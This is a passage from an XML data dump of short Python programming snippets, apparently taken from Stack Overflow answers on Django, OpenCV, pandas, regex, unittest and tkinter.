</snippet></ROW><ROW><id>20451270</id><snippet>re</snippet></ROW><ROW><id>20451270</id><snippet>*</snippet></ROW><ROW><id>20451270</id><snippet>+</snippet></ROW><ROW><id>20451270</id><snippet>?</snippet></ROW><ROW><id>20451270</id><snippet>&lt;.&gt;</snippet></ROW><ROW><id>20451270</id><snippet>'&lt;H1&gt;title&lt;/H1&gt;'</snippet></ROW><ROW><id>20451270</id><snippet>?</snippet></ROW><ROW><id>20451270</id><snippet>.?</snippet></ROW><ROW><id>20451325</id><snippet>saved_searches</snippet></ROW><ROW><id>20451325</id><snippet>terms = user.terms_set.values_list('saved_searches', flat=True)
</snippet></ROW><ROW><id>20451325</id><snippet>terms = Terms.object.filter(user=user).values_list('saved_searches', flat=True)
</snippet></ROW><ROW><id>20451325</id><snippet>text = 'Hi %s, here are your alerts: %s.' % (user.username, ', '.join(terms))
</snippet></ROW><ROW><id>20451326</id><snippet>ImproperlyConfigured: The STATICFILES_DIRS setting should not contain the STATIC_ROOT setting
</snippet></ROW><ROW><id>20451326</id><snippet>STATIC_ROOT = '/home/hussain/django/ratingsite/ratingsite/static'

STATICFILES_DIRS = (
   '/home/hussain/django/ratingsite/ratingsite/static',)
</snippet></ROW><ROW><id>20451326</id><snippet>ImproperlyConfigured</snippet></ROW><ROW><id>20451326</id><snippet>STATIC_ROOT</snippet></ROW><ROW><id>20451326</id><snippet>/public/static/</snippet></ROW><ROW><id>20451326</id><snippet>STATICFILES_DIRS</snippet></ROW><ROW><id>20451326</id><snippet>$ ./manage.py collectstatic</snippet></ROW><ROW><id>20451326</id><snippet>STATIC_ROOT</snippet></ROW><ROW><id>20451326</id><snippet>STATIC_ROOT</snippet></ROW><ROW><id>20451326</id><snippet>collectstatic</snippet></ROW><ROW><id>20451346</id><snippet>openCV</snippet></ROW><ROW><id>20451346</id><snippet>show</snippet></ROW><ROW><id>20451346</id><snippet>waitKey</snippet></ROW><ROW><id>20451473</id><snippet>bar = __import__(whatever)</snippet></ROW><ROW><id>20452209</id><snippet>getClass()</snippet></ROW><ROW><id>20452209</id><snippet># Ruby
class Foo
  def class­()
    retur­n Strin­g
  end
end
String.new().class() == String # =&gt; true
Foo.new().class() == Foo # =&gt; false
</snippet></ROW><ROW><id>20452209</id><snippet># Python
class Foo: pass
class Bar: pass
p = Foo()
p.__class__ == Foo # =&gt; True
p.__class__ = Bar
p.__class__ == Foo # =&gt; False
</snippet></ROW><ROW><id>20452209</id><snippet>// JavaScript
function Foo() { }
function Bar() { }
var p = new Foo();
p.constructor == Foo; // =&gt; true
p.constructor = Bar;
p.constructor == Foo; // =&gt; false
</snippet></ROW><ROW><id>20452209</id><snippet>__class__</snippet></ROW><ROW><id>20452209</id><snippet>p</snippet></ROW><ROW><id>20452209</id><snippet>Bar</snippet></ROW><ROW><id>20452267</id><snippet>import numpy as np
import cv2

# details of rectangle to be drawn.
x, y, h, w = (493, 305, 125, 90)

cap = cv2.VideoCapture(0)

while 1:
  ret, frame = cap.read()

  if not ret or not frame:
    # camera didn't give us a frame.
    continue

  # draw a rectangle.
  cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)

  # show it ;)
  cv2.imshow('img', frame)
</snippet></ROW><ROW><id>20452327</id><snippet>os.fork()</snippet></ROW><ROW><id>20452327</id><snippet>cat /proc/sys/kernel/pid_max
</snippet></ROW><ROW><id>20452327</id><snippet>/etc/security/limits.conf</snippet></ROW><ROW><id>20452351</id><snippet>sudo su
</snippet></ROW><ROW><id>20452351</id><snippet>pip install tweepy
</snippet></ROW><ROW><id>20452382</id><snippet>unittests.main()</snippet></ROW><ROW><id>20452382</id><snippet>TestCase</snippet></ROW><ROW><id>20452382</id><snippet>myTests</snippet></ROW><ROW><id>20452382</id><snippet>__main__</snippet></ROW><ROW><id>20452382</id><snippet>myTests.py</snippet></ROW><ROW><id>20452382</id><snippet>import unittest
import calc

class TestSequenceFunctions(unittest.TestCase):
    def setUp(self):
        self.testInput = 10

    def test_first(self):
        output = calc.first(self.testInput)
        correct = 100
        assert(output == correct)

    def test_second(self):
        output = calc.second(self.testInput)
        correct = 1000
        assert(output == correct)

if __name__ == '__main__':
    unittest.main()
</snippet></ROW><ROW><id>20452382</id><snippet>python myTests.py</snippet></ROW><ROW><id>20452382</id><snippet>myTests</snippet></ROW><ROW><id>20452382</id><snippet>unittest.main()</snippet></ROW><ROW><id>20452382</id><snippet>import myTests</snippet></ROW><ROW><id>20452382</id><snippet>__main__</snippet></ROW><ROW><id>20452382</id><snippet>myTests</snippet></ROW><ROW><id>20452382</id><snippet>calc</snippet></ROW><ROW><id>20452382</id><snippet>if __name__ == "__main__":
    main()
    try:
        import myTests
        myTests.unittest.main(myTests)
    except SystemExit:
        pass
</snippet></ROW><ROW><id>20452387</id><snippet>from ctypes import *

library = cdll.LoadLibrary('distribution/library/libhelpers.dylib')

class Service(object):
    def __init__(self, port):
        library.create_service.restype = c_void_p
        self.obj = library.create_service(port)

    def __del__(self):
        library.release_service.argtypes = [c_void_p]
        library.release_service(self.obj);
</snippet></ROW><ROW><id>20452414</id><snippet>    results = c.execute("SELECT cid FROM test WHERE pid=?", (the_related_id,)).fetchmany(N)
</snippet></ROW><ROW><id>20452414</id><snippet>    results = c.execute("SELECT cid FROM test WHERE pid=?", (the_related_id,)).fetchall()
</snippet></ROW><ROW><id>20452590</id><snippet>def information(sentence):
    '''Splits the sentence on space and returns it as tuple'''
    split_up = tuple(sentence.split(' '))
    return split_up

def print_as_string():
    '''Prints tuple as string'''
    sentence = "welcome to SO dear friend"
    print(" ".join(information(sentence)))

if __name__ == "__main__":
    print_as_string()
</snippet></ROW><ROW><id>20452594</id><snippet>soup.find(id=re.compile("id_\d+_name")) 
</snippet></ROW><ROW><id>20452594</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; "id_%s_name" % (re.compile("\d+"))
'id_&lt;_sre.SRE_Pattern object at 0x10f111750&gt;_name'
</snippet></ROW><ROW><id>20452788</id><snippet>wx.ToolTip</snippet></ROW><ROW><id>20452788</id><snippet>import wx

class MyFrame(wx.Frame):
  def __init__(self, title, *args, **kwargs):
    super(MyFrame, self).__init__(None, title=title, *args, **kwargs)
    panel  = wx.Panel(self)
    button = wx.Button(panel, label="Button")
    tooltip = wx.ToolTip("Try to click this button")
    button.SetToolTip(tooltip)

class MyApp(wx.App):
  def OnInit(self):
    self.frame = MyFrame("Example")
    self.frame.Show()
    return True

MyApp(False).MainLoop()
</snippet></ROW><ROW><id>20452865</id><snippet>os</snippet></ROW><ROW><id>20452865</id><snippet>with open('index.html', 'w'):
    pass
</snippet></ROW><ROW><id>20452865</id><snippet>with open('index.html', 'w') as f:
    f.write('')
</snippet></ROW><ROW><id>20453014</id><snippet>r = np.array(intrsctd_pnts(A,B, axis_dx))
idx = np.where(np.sum(np.diff(r, axis=0)**2, -1) &lt; 1e-20)[0]+1
r2 = np.delete(r, idx, axis=0)
</snippet></ROW><ROW><id>20453494</id><snippet>from django.contrib.auth.models import User
from django.db.models import Q
user = User.objects.filter(Q(user=id) | Q(email=id) | [...])[0]
</snippet></ROW><ROW><id>20453494</id><snippet>get()</snippet></ROW><ROW><id>20453580</id><snippet>Counter</snippet></ROW><ROW><id>20453580</id><snippet>from collections import Counter
import numpy as np

mat=[[1,2,3],[3,2,1],[5,4,6]]
mat = np.matrix(mat)

submat = mat[a-1:c,b-1:d] # extract the sub matrix desired

flattened = np.array(submat.flatten()).flatten() #flatten it for use in counter

print Counter(flattened) # prints the counts of each unique item

len_unique = len(Counter(flattened)) # the total number of unique items.
</snippet></ROW><ROW><id>20453600</id><snippet>set_1 = [["yes", 1], ["maybe", 1], ["never", 0], ["nopes", 0], ["si", 1]]
set_2 = ["of course", "yes", "always", "never", "no way", "no"]

def predict_label(item):
    return 2 # just to check which items got predicted

dset_1 = dict(set_1)

labeled_set_2 = [[item, dset_1.get(item, predict_label(item))] for item in set_2]
print labeled_set_2
</snippet></ROW><ROW><id>20453600</id><snippet>[['of course', 2], ['yes', 1], ['always', 2], ['never', 0], ['no way', 2], ['no', 2]]
</snippet></ROW><ROW><id>20453600</id><snippet>get</snippet></ROW><ROW><id>20453600</id><snippet>get</snippet></ROW><ROW><id>20453600</id><snippet>predict_label(item)</snippet></ROW><ROW><id>20453600</id><snippet>set_1 = [["yes", 1], ["maybe", 1], ["never", 0], ["nopes", 0], ["si", 1]]
set_2 = ["of course", "yes", "always", "never", "no way", "no"]

def predict_label(item):
    return 2 # just to check which items got predicted

def labeled_set(set1, set2):
    dset_1 = dict(set1)
    labeled_set_2 = []
    for item in set2:
        if item in dset_1.keys():
            labeled_set_2.append([item, dset_1[item]])
        else:
            labeled_set_2.append([item, predict_label(item)])
    return labeled_set_2

print labeled_set(set_1, set_2)
</snippet></ROW><ROW><id>20453601</id><snippet>StringVar</snippet></ROW><ROW><id>20453601</id><snippet>labelVar = StringVar()
label = Label(..., textvariable=labelVar)
...
# label is automatically updated by this statement:
labelVar.set(newValue)
</snippet></ROW><ROW><id>20453601</id><snippet>configure</snippet></ROW><ROW><id>20453601</id><snippet>label = Label(...)
...
# update the label with the configure method:
label.configure(text=newValue)
</snippet></ROW><ROW><id>20453641</id><snippet>
sudo apt-get install python-dev libsdl-image1.2-dev libsdl-mixer1.2-dev libsdl-ttf2.0-dev   libsdl1.2-dev libsmpeg-dev python-numpy subversion libportmidi-dev ffmpeg libswscale-dev libavformat-dev libavcodec-dev
</snippet></ROW><ROW><id>20453641</id><snippet>sudo apt-get install python-pygame</snippet></ROW><ROW><id>20453687</id><snippet>m = re.search('&lt;ca&gt;(.+?)&lt;/ca&gt;', f, re.DOTALL)
</snippet></ROW><ROW><id>20453687</id><snippet>m = re.search('&lt;ca&gt;((?:[^&lt;]+|&lt;+(?!/ca&gt;))+)&lt;/ca&gt;', f)
</snippet></ROW><ROW><id>20453687</id><snippet>m.group(1)</snippet></ROW><ROW><id>20453806</id><snippet>a = "fun"
a.capitalize()
print a
&gt;&gt; fun
</snippet></ROW><ROW><id>20453806</id><snippet>a</snippet></ROW><ROW><id>20453806</id><snippet>a</snippet></ROW><ROW><id>20453806</id><snippet>str.replace</snippet></ROW><ROW><id>20453806</id><snippet>a = "fun"
a = a.replace("u", "a")
print a
&gt;&gt; fan
</snippet></ROW><ROW><id>20453806</id><snippet>a</snippet></ROW><ROW><id>20453806</id><snippet>a</snippet></ROW><ROW><id>20453806</id><snippet>a</snippet></ROW><ROW><id>20453806</id><snippet>&gt;&gt;&gt; a = '[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]'; b = '[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]'
&gt;&gt;&gt; id(a), id(b)
(4561897488, 4561897488)

&gt;&gt;&gt; a = '[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]'
&gt;&gt;&gt; b = '[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]'
&gt;&gt;&gt; id(a), id(b)
(4561897416, 4561897632)
</snippet></ROW><ROW><id>20453806</id><snippet>&gt;&gt;&gt; a = 100000
&gt;&gt;&gt; b = 100000
&gt;&gt;&gt; id(a), id(b)
(140533800516256, 140533800516304)

&gt;&gt;&gt; a = 100000; b = 100000 
&gt;&gt;&gt; id(a), id(b)
(140533800516232, 140533800516232) 
</snippet></ROW><ROW><id>20453806</id><snippet>4406456232 4406456232
4406456232 4406456232
140219722644160 140219722644160
</snippet></ROW><ROW><id>20454000</id><snippet>:</snippet></ROW><ROW><id>20454000</id><snippet>hello:</snippet></ROW><ROW><id>20454000</id><snippet>hello_</snippet></ROW><ROW><id>20454000</id><snippet>import pymel.core as pc
pc.namespace(set = ":")         # just in case if there is any preset namespace

for obj in pc.ls(rn=False):     # Referenced objects cannot be renamed
    if "hello:" in obj:
        pc.rename(obj, obj.replace(":", "_"))
</snippet></ROW><ROW><id>20454000</id><snippet>cmd.file(,,rpr = "hello",,,)</snippet></ROW><ROW><id>20454069</id><snippet>raw_input</snippet></ROW><ROW><id>20454069</id><snippet>str</snippet></ROW><ROW><id>20454069</id><snippet>"12" * 3 = "121212"</snippet></ROW><ROW><id>20454069</id><snippet>int</snippet></ROW><ROW><id>20454069</id><snippet>answer = raw_input('Your Answer: ')
answer = int(answer)
</snippet></ROW><ROW><id>20454069</id><snippet>answer = int(raw_input('Your Answer: '))
</snippet></ROW><ROW><id>20454117</id><snippet>previous</snippet></ROW><ROW><id>20454117</id><snippet>while cursor != None:
    if cursor.element == element:
        if cursor == self.head:
            self.remove()
        else:
            previous.next = cursor.next                
    else:
        previous = cursor

    cursor = cursor.next
</snippet></ROW><ROW><id>20454117</id><snippet>previous</snippet></ROW><ROW><id>20454117</id><snippet>cursor</snippet></ROW><ROW><id>20454135</id><snippet>out = initial_input
for func in [function1, function2, function3, function4]:
    out = func(out)
</snippet></ROW><ROW><id>20454242</id><snippet>host</snippet></ROW><ROW><id>20454242</id><snippet>par1</snippet></ROW><ROW><id>20454242</id><snippet>par2</snippet></ROW><ROW><id>20454242</id><snippet>time</snippet></ROW><ROW><id>20454242</id><snippet>datetime.datetime</snippet></ROW><ROW><id>20454242</id><snippet>import datetime as DT
time = [DT.datetime.fromtimestamp(t/1000) for t in time]
...
p1, = host.plot(time, temp)
p2, = par1.plot(time, hum)
p3, = par2.plot(time, light_lv)
</snippet></ROW><ROW><id>20454242</id><snippet>i</snippet></ROW><ROW><id>20454242</id><snippet>time</snippet></ROW><ROW><id>20454242</id><snippet>temp</snippet></ROW><ROW><id>20454242</id><snippet>data</snippet></ROW><ROW><id>20454242</id><snippet>i, time, temp, hum, light_lv, light_v = np.loadtxt(
    'DHT11.csv', delimiter = ',', skiprows = 1,
    usecols = (0,2,3,4,5,6), unpack = 1)

time = [DT.datetime.fromtimestamp(t/1000) for t in time]
light_lv = 1.0/light_lv*1000
</snippet></ROW><ROW><id>20454242</id><snippet>x-axis</snippet></ROW><ROW><id>20454242</id><snippet>datetime.datetime</snippet></ROW><ROW><id>20454242</id><snippet>import matplotlib.dates as mdates
xfmt = mdates.DateFormatter('%Y-%m-%d %H:%M:%S')
ax.xaxis.set_major_formatter(xfmt)
</snippet></ROW><ROW><id>20454242</id><snippet>x-axis</snippet></ROW><ROW><id>20454242</id><snippet>import datetime as DT
import matplotlib.ticker as ticker
xfmt = ticker.FuncFormatter(lambda timestamp, pos: DT.fromtimestamp(x/1000.0).strftime('%Y-%m-%d'))
ax.xaxis.set_major_formatter(xfmt)
</snippet></ROW><ROW><id>20454242</id><snippet>ax</snippet></ROW><ROW><id>20454242</id><snippet>host</snippet></ROW><ROW><id>20454242</id><snippet>par1</snippet></ROW><ROW><id>20454242</id><snippet>par2</snippet></ROW><ROW><id>20454306</id><snippet>
export PYTHON=python2.7
</snippet></ROW><ROW><id>20454355</id><snippet>width=1.0</snippet></ROW><ROW><id>20454355</id><snippet>bar()</snippet></ROW><ROW><id>20454355</id><snippet>xs.bar(bar_lefts, bar_heights, width=1.0, facecolor='black', edgecolor='black')</snippet></ROW><ROW><id>20454420</id><snippet>range(3)</snippet></ROW><ROW><id>20454420</id><snippet>range</snippet></ROW><ROW><id>20454420</id><snippet>next</snippet></ROW><ROW><id>20454577</id><snippet>class Registration():
    'Class telling us what modules students are taking'
    def __init__(self):
        self.regdict = {}
    def add(self, name, module):
        self.regdict.setdefault(name, []).append(Modules(module))
    def modules(self, name):
        return self.regdict[name]
</snippet></ROW><ROW><id>20454688</id><snippet>itertools.takewhile</snippet></ROW><ROW><id>20454688</id><snippet>&gt;&gt;&gt; from itertools import takewhile
&gt;&gt;&gt; lis = ['Amazon', 'Apple', 'Microsoft', 'Google', 'Amazon', 'Ebay', 'Apple', 'Paypal', 'Google']
&gt;&gt;&gt; c = Counter(lis)
&gt;&gt;&gt; items = c.most_common()
</snippet></ROW><ROW><id>20454688</id><snippet>&gt;&gt;&gt; max_ = items[0][1]
</snippet></ROW><ROW><id>20454688</id><snippet>max_</snippet></ROW><ROW><id>20454688</id><snippet>&gt;&gt;&gt; list(takewhile(lambda x: x[1]==max_,  items))
[('Google', 2), ('Apple', 2), ('Amazon', 2)]
</snippet></ROW><ROW><id>20454688</id><snippet>Counter.most_common</snippet></ROW><ROW><id>20454688</id><snippet>most_common(self, n=None)
</snippet></ROW><ROW><id>20454688</id><snippet>n</snippet></ROW><ROW><id>20454688</id><snippet>n</snippet></ROW><ROW><id>20454688</id><snippet>n</snippet></ROW><ROW><id>20454688</id><snippet>&gt;&gt;&gt; c.most_common(4)
[('Google', 2), ('Apple', 2), ('Amazon', 2), ('Paypal', 1)]
&gt;&gt;&gt; c.most_common()[:4]
[('Google', 2), ('Apple', 2), ('Amazon', 2), ('Paypal', 1)]
</snippet></ROW><ROW><id>20454735</id><snippet>struct_time</snippet></ROW><ROW><id>20454735</id><snippet>time.strptime</snippet></ROW><ROW><id>20454735</id><snippet>time.localtime</snippet></ROW><ROW><id>20454735</id><snippet>&gt;&gt;&gt; alarm_time = time.strptime('23:46:00', '%H:%M:%S')
&gt;&gt;&gt; today = time.localtime()
&gt;&gt;&gt; time.struct_time(today[:3] + alarm_time[3:])
time.struct_time(tm_year=2013, tm_mon=12, tm_mday=8,
                 tm_hour=23, tm_min=46, tm_sec=0, tm_wday=0,
                 tm_yday=1, tm_isdst=-1)
</snippet></ROW><ROW><id>20455053</id><snippet> form1 = SQLFORM(....)
</snippet></ROW><ROW><id>20455053</id><snippet> db.auth_user.fieldname.writable = db.auth_user.fieldname.readable = False
</snippet></ROW><ROW><id>20455053</id><snippet> db.define_table('auth_user', ....)
</snippet></ROW><ROW><id>20455090</id><snippet> result = pd.read_pickle('pickle_L1cor_s1.pic')
</snippet></ROW><ROW><id>20455090</id><snippet>ndarray</snippet></ROW><ROW><id>20455090</id><snippet>NDFrame</snippet></ROW><ROW><id>20455090</id><snippet>DataFrame</snippet></ROW><ROW><id>20455090</id><snippet>Panel</snippet></ROW><ROW><id>20455090</id><snippet>`TypeError: _reconstruct: First argument must be a sub-type of ndarray</snippet></ROW><ROW><id>20455121</id><snippet>model.fit([X])
</snippet></ROW><ROW><id>20455121</id><snippet>model.fit([X1,X2,X3])
</snippet></ROW><ROW><id>20455121</id><snippet>model.fit(S)
</snippet></ROW><ROW><id>20455157</id><snippet>raw_input</snippet></ROW><ROW><id>20455157</id><snippet>sys.stdin</snippet></ROW><ROW><id>20455157</id><snippet>&gt;&gt;&gt;import sys
&gt;&gt;&gt;input = sys.stdin.read()
hi
this text has
new lines
Ctrl^D
&gt;&gt;&gt;print input
hi
this text has
new lines
</snippet></ROW><ROW><id>20455175</id><snippet>accept</snippet></ROW><ROW><id>20455277</id><snippet>data = pd.DataFrame([[1.4,2.5,3.8,4.4,5.6],[6.2,7.6,8.8,9.1,0]] ).T
</snippet></ROW><ROW><id>20455277</id><snippet>     0    1
0  1.4  6.2
1  2.5  7.6
2  3.8  8.8
3  4.4  9.1
4  5.6  0.0
</snippet></ROW><ROW><id>20455277</id><snippet>data = pd.DataFrame({'A':[1.4,2.5,3.8,4.4,5.6],'B':[6.2,7.6,8.8,9.1,0]} )
</snippet></ROW><ROW><id>20455277</id><snippet>data.apply( pd.Series.round )
</snippet></ROW><ROW><id>20455277</id><snippet>import numpy as np
data.apply( np.round )
</snippet></ROW><ROW><id>20455283</id><snippet>x=variable</snippet></ROW><ROW><id>20455283</id><snippet>x</snippet></ROW><ROW><id>20455283</id><snippet>variable</snippet></ROW><ROW><id>20455283</id><snippet>name</snippet></ROW><ROW><id>20455283</id><snippet>variable.name</snippet></ROW><ROW><id>20455283</id><snippet>'Alarm'</snippet></ROW><ROW><id>20455283</id><snippet>print(list_of_variables)</snippet></ROW><ROW><id>20455283</id><snippet>[&lt;class '__main__.variable'&gt;, &lt;class '__main__.variable'&gt;, 
</snippet></ROW><ROW><id>20455283</id><snippet>x = variable</snippet></ROW><ROW><id>20455283</id><snippet>x = variable()</snippet></ROW><ROW><id>20455283</id><snippet>[&lt;__main__.variable object at 0x6ffffee65d0&gt;, &lt;__main__.variable object at 0x6ffffee6610&gt;
</snippet></ROW><ROW><id>20455495</id><snippet>.sorted()</snippet></ROW><ROW><id>20455495</id><snippet>.split()</snippet></ROW><ROW><id>20455495</id><snippet>sorted</snippet></ROW><ROW><id>20455495</id><snippet>&gt;&gt;&gt; dic = {"indianapolis":"indiana", "columbus":"ohio", "jackson":"mississippi", "phoenix":"arizona"}
&gt;&gt;&gt; {dic[k]:k for k in sorted(dic)}
{'ohio': 'columbus', 'mississippi': 'jackson', 'arizona': 'phoenix', 'indiana': 'indianapolis'}
</snippet></ROW><ROW><id>20455495</id><snippet>sorted</snippet></ROW><ROW><id>20455495</id><snippet>&gt;&gt;&gt; sorted(dic)
['columbus', 'indianapolis', 'jackson', 'phoenix']
&gt;&gt;&gt; new_dic = {}
&gt;&gt;&gt; for k in sorted(dic):
...     new_dic[dic[k]] = k
...     
&gt;&gt;&gt; new_dic
{'ohio': 'columbus', 'mississippi': 'jackson', 'arizona': 'phoenix', 'indiana': 'indianapolis'}
</snippet></ROW><ROW><id>20455495</id><snippet>def interchange(input_dict):
    return {input_dict[k]:k for k in sorted(input_dict)}
... 
&gt;&gt;&gt; interchange(dic)
{'ohio': 'columbus', 'mississippi': 'jackson', 'arizona': 'phoenix', 'indiana': 'indianapolis'}
</snippet></ROW><ROW><id>20455550</id><snippet>urlparse.urlparse</snippet></ROW><ROW><id>20455550</id><snippet>urlparse.parse_qs</snippet></ROW><ROW><id>20455550</id><snippet>&gt;&gt;&gt; import urlparse
&gt;&gt;&gt;
&gt;&gt;&gt; url = 'http://www.youtube.com/watch?v=cUjfXWuZySE&amp;list=cUjfXWuZySE'
&gt;&gt;&gt; parts = urlparse.urlparse(url)
&gt;&gt;&gt; urlparse.parse_qs(parts.query)
{'list': ['cUjfXWuZySE'], 'v': ['cUjfXWuZySE']}
&gt;&gt;&gt; {name:values[0] for name, values in urlparse.parse_qs(parts.query).iteritems()}
{'list': 'cUjfXWuZySE', 'v': 'cUjfXWuZySE'}
</snippet></ROW><ROW><id>20455649</id><snippet>python</snippet></ROW><ROW><id>20455800</id><snippet>numpy.random.binomial</snippet></ROW><ROW><id>20455800</id><snippet>size</snippet></ROW><ROW><id>20455800</id><snippet>z = np.random.binomial(500, 0.5, size=499)
</snippet></ROW><ROW><id>20456023</id><snippet>res = sum(x for x in range(100, 2001) if x % 3 == 0)
</snippet></ROW><ROW><id>20456103</id><snippet>blist = []
for i in range(1, height+1):
    tmpList = []
    for j in range(1, width+1):
        btn = tk.Button(playfield, text = '   ')
        tmpList.append(btn)

        def handler(event, i=i, j=j):
            return floodfill(event, field, blist, j, i)
        btn.bind('&lt;ButtonRelease-1&gt;', handler)
        btn.bind('&lt;Button-3&gt;', iconToggle)
        btn.grid(row=i-1, column=j-1)

    blist.append(tmpList)
</snippet></ROW><ROW><id>20456103</id><snippet> if field[y][x] != '9':
        Button_To_Hide = blist[x-1][y-1] 
        Button_To_Hide.grid_forget()
</snippet></ROW><ROW><id>20456319</id><snippet>num = re.match("r\d[0-9]{2}$", num())</snippet></ROW><ROW><id>20456319</id><snippet>num</snippet></ROW><ROW><id>20456319</id><snippet>num()</snippet></ROW><ROW><id>20456319</id><snippet>match = re.match("r\d[0-9]{2}$", str(num))</snippet></ROW><ROW><id>20456319</id><snippet>match</snippet></ROW><ROW><id>20456319</id><snippet>re</snippet></ROW><ROW><id>20456319</id><snippet>str</snippet></ROW><ROW><id>20456319</id><snippet>str(num)</snippet></ROW><ROW><id>20456355</id><snippet>svn</snippet></ROW><ROW><id>20456355</id><snippet>svn cat url_to_repo/path/to/tarball
</snippet></ROW><ROW><id>20456355</id><snippet>subprocess</snippet></ROW><ROW><id>20456355</id><snippet>svn</snippet></ROW><ROW><id>20456355</id><snippet>subprocess.PIPE</snippet></ROW><ROW><id>20456355</id><snippet>#!/usr/bin/env python

import subprocess

svn_with_args = ['svn', 'cat', 'url_to_repo/path/to/tarball']
proc = subprocess.Popen(svn_with_args, stdout=subprocess.PIPE)
content = ''.join(proc.stdout.readlines())
</snippet></ROW><ROW><id>20456370</id><snippet>E = [E1, E2, E3, E4]
k = [k1, k2, k3, k4]
</snippet></ROW><ROW><id>20456370</id><snippet>E = np.array([E1, E2, E3, E4])
k = np.array([k1, k2, k3, k4])
</snippet></ROW><ROW><id>20456576</id><snippet>result = None
with open('input.txt') as f:
    result = [tuple(line.split()) for line in f]

for t in result:
    print(t)
</snippet></ROW><ROW><id>20456741</id><snippet>cmd = "C:/Program Files (x86)/iTunes/iTunes.exe"
</snippet></ROW><ROW><id>20456741</id><snippet>\\</snippet></ROW><ROW><id>20456851</id><snippet>def get_addresses(fname):
    addresses = {}
    with open(fname) as f:
        lines = [l.strip().lower() for l in f]

    for i, line in enumerate(lines):
        if line.startswith("ip address"):
            ip = line.split(": ")[1]
            address_type = lines[i-1]
            if address_type == "entry address(es):":
                addresses["entry"] = ip
            elif address_type == "management address(es):":
                addresses["management"] = ip
            # Add additional address type handling here

    return addresses
</snippet></ROW><ROW><id>20457003</id><snippet>Manager()</snippet></ROW><ROW><id>20457003</id><snippet>manager.Dict()</snippet></ROW><ROW><id>20457003</id><snippet>def insert_ngram(queue, managerDict):
    # create a local dictionary with vivification
    localDict = Vividict() 
    # copy the existing manager.dict to the local dict.
    localDict.update(managerDict) 
    #do stuff 
    # copy the local dictionary to the manager dict
    managerDict.update(localDict) 
    return 
</snippet></ROW><ROW><id>20457018</id><snippet>r</snippet></ROW><ROW><id>20457018</id><snippet>print(repr(r))</snippet></ROW><ROW><id>20457018</id><snippet>pow</snippet></ROW><ROW><id>20457018</id><snippet>r = input()
</snippet></ROW><ROW><id>20457018</id><snippet>input</snippet></ROW><ROW><id>20457018</id><snippet>r = input
</snippet></ROW><ROW><id>20457018</id><snippet>input</snippet></ROW><ROW><id>20457018</id><snippet>r</snippet></ROW><ROW><id>20457048</id><snippet>s_pat_row</snippet></ROW><ROW><id>20457048</id><snippet>,</snippet></ROW><ROW><id>20457048</id><snippet>\t</snippet></ROW><ROW><id>20457048</id><snippet>(\S+)</snippet></ROW><ROW><id>20457048</id><snippet>s_pat_row</snippet></ROW><ROW><id>20457048</id><snippet>s_pat_row = r'''
    "([^"]+)"          # match column; this is group 1
    \s*\t\s*           # match separating tab and any optional white space
    ([^\t]+)           # match a string of non-tab chars; this is group 2
    \s*\t\s*           # match separating tab and any optional white space
    "((?:\\"|[^"])*)"  # match string data that can include escaped quotes
'''
</snippet></ROW><ROW><id>20457115</id><snippet>answer = str(round(answer, 2))
</snippet></ROW><ROW><id>20457134</id><snippet>def f():
  print(a)
</snippet></ROW><ROW><id>20457134</id><snippet>dis.dis(f)
  2           0 LOAD_GLOBAL              0 (print) 
              3 LOAD_GLOBAL              1 (a) #aha!
              6 CALL_FUNCTION            1 (1 positional, 0 keyword pair) 
              9 POP_TOP              
             10 LOAD_CONST               0 (None) 
             13 RETURN_VALUE
</snippet></ROW><ROW><id>20457134</id><snippet>a</snippet></ROW><ROW><id>20457134</id><snippet>f</snippet></ROW><ROW><id>20457134</id><snippet>a</snippet></ROW><ROW><id>20457134</id><snippet>a</snippet></ROW><ROW><id>20457134</id><snippet>def g():
    x += 1

dis.dis(g)
  2           0 LOAD_FAST                0 (x) #note no assumption that it is global
              3 LOAD_CONST               1 (1) 
              6 INPLACE_ADD          
              7 STORE_FAST               0 (x) 
             10 LOAD_CONST               0 (None) 
             13 RETURN_VALUE  
</snippet></ROW><ROW><id>20457134</id><snippet>x = [1]

def f():
    x[0] += 1

f()
#x is now [2]
</snippet></ROW><ROW><id>20457134</id><snippet>x</snippet></ROW><ROW><id>20457134</id><snippet>+=</snippet></ROW><ROW><id>20457134</id><snippet>__setattr__</snippet></ROW><ROW><id>20457134</id><snippet>nonlocal</snippet></ROW><ROW><id>20457255</id><snippet>next = driver.find_element_by_xpath("//li[@class='next']/a")
prev = driver.find_element_by_xpath("//li[@class='previous']/a")
</snippet></ROW><ROW><id>20457255</id><snippet>next = driver.find_element_by_xpath("//a[text()='Next']")
prev = driver.find_element_by_xpath("//a[text()='Previous']")
</snippet></ROW><ROW><id>20457302</id><snippet>request.GET</snippet></ROW><ROW><id>20457338</id><snippet>def pkcs7_pad(data, blocksize=16):
    padlen = blocksize - len(data) % blocksize
    return data + bytes([padlen]) * padlen


def pkcs7_unpad(data, blocksize=16):
    if data:
        padlen = data[-1]
        if 0 &lt; padlen &lt; blocksize:
            if data.endswith(bytes([padlen]) * padlen):
                return data[:-padlen]

    raise ValueError('incorrect padding')
</snippet></ROW><ROW><id>20457341</id><snippet>list</snippet></ROW><ROW><id>20457341</id><snippet>list</snippet></ROW><ROW><id>20457341</id><snippet>dict</snippet></ROW><ROW><id>20457341</id><snippet>get</snippet></ROW><ROW><id>20457341</id><snippet>dict</snippet></ROW><ROW><id>20457341</id><snippet>replacement_words = {'jan':'janice','foo':'bar'}
my_list = ['jan','is','cool']

[replacement_words.get(word,word) for word in my_list]
Out[41]: ['janice', 'is', 'cool']
</snippet></ROW><ROW><id>20457443</id><snippet>callback</snippet></ROW><ROW><id>20457443</id><snippet>after</snippet></ROW><ROW><id>20457443</id><snippet>callback</snippet></ROW><ROW><id>20457443</id><snippet>stopit</snippet></ROW><ROW><id>20457443</id><snippet>s</snippet></ROW><ROW><id>20457443</id><snippet>global</snippet></ROW><ROW><id>20457443</id><snippet>def stopit():
    global s
    s = 1
    print "stopped"

def callback():
    if s == 0:
        print "called the callback!"
    root.after(3000, callback)
</snippet></ROW><ROW><id>20457483</id><snippet>chi2_contingency</snippet></ROW><ROW><id>20457483</id><snippet>residuals</snippet></ROW><ROW><id>20457483</id><snippet>stdres</snippet></ROW><ROW><id>20457483</id><snippet>from __future__ import division

import numpy as np
